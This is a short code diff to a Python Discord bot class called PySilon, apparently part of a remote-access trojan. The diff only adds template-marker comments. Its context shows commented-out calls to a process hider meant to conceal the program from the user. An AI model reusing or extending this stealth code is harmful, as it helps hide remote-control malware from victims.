@@ -36,6 +36,8 @@ class PySilon(commands.Bot):
         #    proccess_was_hidden = False
         #    if proc_hider.hide_process(): proccess_was_hidden = True
 
+        #!preload.intendation=2
+
         self.load_bot(command_prefix, self_bot)
 
     async def first_run_check(self) -> None:
@@ -111,7 +113,7 @@ class PySilon(commands.Bot):
         async def server(ctx):
             await ctx.channel.send('asdasd')
         
-        #commands.intendation=2
+        #!commands.intendation=2
         
     def fetch_working_dir(self):
         try:
